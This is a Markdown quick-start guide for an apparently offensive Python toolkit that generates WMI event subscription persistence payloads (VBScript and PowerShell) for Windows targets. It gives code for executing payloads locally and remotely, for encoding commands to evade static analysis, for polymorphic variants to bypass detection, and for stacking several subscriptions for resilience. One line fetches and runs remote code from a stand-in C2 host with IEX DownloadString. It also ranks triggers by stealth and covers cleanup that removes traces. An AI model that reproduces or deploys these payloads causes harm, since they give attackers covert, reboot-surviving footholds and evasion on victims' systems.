# WMI Event Subscription - Quick Start Guide

## Installation

```bash
# No external dependencies required
# Uses only Python standard library
python3 -m pip install --upgrade  # Optional, for development

# Verify installation
python3 wmi_event_subscription.py
```

## 5-Minute Quick Start

### Basic Usage

```python
from wmi_event_subscription import create_event_subscription

# Create subscription
subscription = create_event_subscription()

# Generate payload for process startup
command = "cmd.exe /c whoami"
payload = subscription.generate_event_subscription_vbs(command)

# Save to file
with open("payload.vbs", "w") as f:
    f.write(payload)

# Execute on target
# cscript.exe payload.vbs
```

### Output

VBS script that:
1. Connects to WMI subscription namespace
2. Creates event filter for process startup events
3. Creates command line consumer with your command
4. Binds filter to consumer
5. Command executes every time a process starts

## Common Use Cases

### Use Case 1: Execute on Any Process Startup

```python
subscription = create_event_subscription()
payload = subscription.generate_event_subscription_vbs("calc.exe")
```

**Result:** Executes calc.exe whenever any process starts

### Use Case 2: Execute on Service Startup

```python
subscription = create_event_subscription()
payload = subscription.generate_service_startup_consumer(
    "powershell.exe",
    "RemoteRegistry"
)
```

**Result:** Executes PowerShell when RemoteRegistry service starts

### Use Case 3: Periodic Execution Every 60 Seconds

```python
subscription = create_event_subscription()
payload = subscription.generate_timer_event_consumer(
    "cmd.exe /c ipconfig",
    60000  # milliseconds
)
```

**Result:** Command runs every 60 seconds

### Use Case 4: Execute on Specific Process Launch

```python
subscription = create_event_subscription()
payload = subscription.generate_event_trigger_subscription(
    "cmd.exe /c echo launched",
    "notepad.exe"
)
```

**Result:** Command executes when notepad.exe starts

### Use Case 5: Hide Command with Encoding

```python
subscription = create_event_subscription()
payload = subscription.generate_encoded_event_subscription(
    "powershell -NoProfile -Command whoami",
    encoding="base64"
)
```

**Result:** Command Base64 encoded, decoded at runtime

## High-Level API

Single-function interface for all subscription types:

```python
from wmi_event_subscription import generate_event_subscription_payload

# Process event
payload = generate_event_subscription_payload("calc.exe", "process")

# Service event
payload = generate_event_subscription_payload("calc.exe", "service", 
                                             service_name="WinRM")

# Timer event (every 30 seconds)
payload = generate_event_subscription_payload("calc.exe", "timer",
                                             interval=30000)

# Encoded (Base64)
payload = generate_event_subscription_payload("calc.exe", "encoded",
                                             encoding="base64")

# Encoded (Hex)
payload = generate_event_subscription_payload("calc.exe", "encoded",
                                             encoding="hex")

# PowerShell implementation
payload = generate_event_subscription_payload("calc.exe", "powershell")

# Asynchronous handler
payload = generate_event_subscription_payload("calc.exe", "async")
```

## Executing Payloads

### On Local Machine

```bash
# Using VBScript
cscript.exe payload.vbs

# Using PowerShell
powershell -ExecutionPolicy Bypass -File payload.ps1
```

### On Remote Machine

```powershell
# PowerShell remoting
Invoke-Command -ComputerName target -ScriptBlock {
    $payload = Get-Content payload.vbs
    cscript.exe -
} -ArgumentList @($payload)
```

## Configuration Options

### Custom Names and Namespaces

```python
from wmi_event_subscription import (
    WMIEventSubscription, EventSubscriptionConfig, EventTriggerType
)

config = EventSubscriptionConfig(
    event_trigger=EventTriggerType.SERVICE_START,
    event_filter_name="MyCustomFilter",
    consumer_name="MyCustomConsumer",
    namespace="root\\subscription",
    obfuscate_names=True,
    hide_errors=True
)

subscription = WMIEventSubscription(config)
payload = subscription.generate_event_subscription_vbs("cmd.exe")
```

## Available Event Triggers

```python
from wmi_event_subscription import EventTriggerType

# Process events
EventTriggerType.PROCESS_START      # Process creation
EventTriggerType.PROCESS_STOP       # Process termination

# Service events
EventTriggerType.SERVICE_START      # Service startup
EventTriggerType.SERVICE_STOP       # Service shutdown

# System events
EventTriggerType.SYSTEM_TIME_CHANGE # System time modified
EventTriggerType.DISK_SPACE_LOW     # Free space drops

# User session events
EventTriggerType.USER_LOGIN         # User logon
EventTriggerType.USER_LOGOUT        # User logoff

# System monitoring
EventTriggerType.REGISTRY_CHANGE    # Registry modification
EventTriggerType.FILE_CHANGE        # File modification
EventTriggerType.NETWORK_ADAPTER_CONFIG  # Network changes

# Timer
EventTriggerType.WMI_CONSUMER_TIMER # Periodic execution
```

## Cleanup & Removal

### Generate Removal Script

```python
subscription = create_event_subscription()
cleanup_payload = subscription.generate_event_subscription_removal(
    "AutoStartEvent",
    "CommandConsumer"
)

# Execute to remove subscriptions
```

### Manual Cleanup (PowerShell)

```powershell
# Remove all event subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

## Testing & Examples

### Run All Examples

```bash
python3 wmi_event_subscription_examples.py
```

### Run Specific Example

```bash
# Example 1: Basic process subscription
python3 wmi_event_subscription_examples.py 1

# Example 2: Service startup
python3 wmi_event_subscription_examples.py 2

# Example 3: Timer-based
python3 wmi_event_subscription_examples.py 3

# ... and so on
```

### Run Test Suite

```bash
python3 test_wmi_event_subscription.py
```

## Examples Output

### Example 1: Basic Subscription
```
[1] Basic Event Subscription (Process Startup)
- Triggers on ANY process creation
- Payload size: ~800 chars
- Persistence: Permanent (survives reboot)
```

### Example 2: Service Startup
```
[2] Service Startup Consumer
- Triggers when RemoteRegistry service starts
- Payload size: ~900 chars
- Persistence: Permanent
- Reliability: High (system service)
```

### Example 3: Timer Events
```
[3] Timer-based Event Consumer
- Executes every 60 seconds
- Payload size: ~700 chars
- Timing: Independent of system events
```

### Example 4: Async Handler
```
[4] Asynchronous Event Handler
- Class-based async event handling
- Non-blocking execution
- Multiple event handling capability
```

### Example 5: Encoded Command
```
[5] Encoded Event Subscription
- Base64 or Hex encoded command
- Inline decoder function
- Hides command from static analysis
```

## Best Practices

### 1. Use Specific Filters

```python
# Instead of monitoring ALL processes:
# "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \"Win32_Process\""

# Monitor specific process:
# "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name=\"explorer.exe\""
```

### 2. Implement Smart Commands

```bash
# Bad: Run immediately
cmd.exe /c whoami

# Better: Check if already running
tasklist | find "process.exe" || cmd.exe /c process.exe
```

### 3. Use Obfuscation

```python
# Encode sensitive commands
payload = subscription.generate_encoded_event_subscription(
    "powershell -NoProfile -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://c2.com\")'",
    encoding="base64"
)
```

### 4. Test Locally First

```bash
# Test on local machine
cscript.exe payload.vbs

# Verify subscription created
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer

# Trigger event
tasklist  # Creates new process, should trigger command
```

### 5. Clean Up When Done

```python
# Generate and execute cleanup script
cleanup = subscription.generate_event_subscription_removal()
# Execute to remove all traces
```

## Troubleshooting

### Issue: Command Not Executing

**Solution 1:** Verify WQL syntax
```python
wql = subscription.generate_event_filter_wql(EventTriggerType.PROCESS_START)
print(wql)  # Check query syntax
```

**Solution 2:** Test command manually
```bash
cmd.exe /c whoami
```

**Solution 3:** Check command paths
```bash
# Use full paths
C:\Windows\System32\cmd.exe /c whoami
```

### Issue: Subscription Not Created

**Solution 1:** Verify permissions
```powershell
Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem
```

**Solution 2:** Check WMI service
```powershell
Get-Service WinMgmt  # Should be Running
```

**Solution 3:** Repair WMI
```powershell
winmgmt /resetrepository
```

### Issue: Cannot Remove Subscriptions

**Solution 1:** Use correct namespace
```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

**Solution 2:** Remove with proper syntax
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='MyFilter'" | Remove-WmiObject
```

## Advanced Usage

### Custom Event Filter

```python
subscription = create_event_subscription()

# Custom WQL query
custom_wql = '''SELECT * FROM __InstanceModificationEvent 
WHERE TargetInstance ISA "Win32_Service" 
AND TargetInstance.State="Running"'''

# Apply custom filter
payload = subscription.generate_event_subscription_vbs("cmd.exe")
# Modify generated VBS to use custom WQL
```

### Multiple Subscriptions

```python
# Create multiple subscriptions for resilience
commands = [
    ("Process Startup", subscription.generate_event_subscription_vbs("cmd.exe")),
    ("Timer 60s", subscription.generate_timer_event_consumer("cmd.exe", 60000)),
    ("Service Start", subscription.generate_service_startup_consumer("cmd.exe"))
]

for name, payload in commands:
    print(f"[{name}]")
    with open(f"{name}.vbs", "w") as f:
        f.write(payload)
```

### Polymorphic Payloads

```python
# Generate variations to bypass detection
for i in range(5):
    config = EventSubscriptionConfig()
    subscription = WMIEventSubscription(config)
    payload = subscription.generate_event_subscription_vbs("cmd.exe")
    print(f"Variant {i}: {len(payload)} chars")
```

## Performance Tips

### Optimize for Speed
```python
# Use timer with reasonable interval
subscription.generate_timer_event_consumer("cmd.exe", 300000)  # 5 minutes

# Avoid high-frequency process monitoring
# Instead use service or user login events
```

### Minimize Overhead
```python
# Use specific event filters
# Avoid broad queries that match many events
# Clean up old subscriptions
```

## Security Considerations

1. **Requires Administrator Privileges:** Most subscription operations require admin
2. **Leaves WMI Artifacts:** Subscriptions stored in WMI repository
3. **Generates Event Logs:** May create audit trail
4. **Detectable:** WMI provider activity visible to monitoring tools

## Quick Reference

| Type | Trigger | Frequency | Stealth |
|------|---------|-----------|---------|
| Process Start | Any process creation | Very High | Medium |
| Service Start | Service startup | Low | High |
| Timer | Fixed interval | Precise | High |
| User Login | Session creation | Per logon | High |
| Registry Change | Registry modification | Low | Very High |

## Next Steps

1. Review examples: `python3 wmi_event_subscription_examples.py`
2. Run tests: `python3 test_wmi_event_subscription.py`
3. Read documentation: `WMI_EVENT_SUBSCRIPTION_DOCUMENTATION.md`
4. Customize for your use case
5. Test locally before deployment

## Support

- Check documentation for detailed API reference
- Review examples for common patterns
- Run tests to verify functionality
- Check troubleshooting section for issues
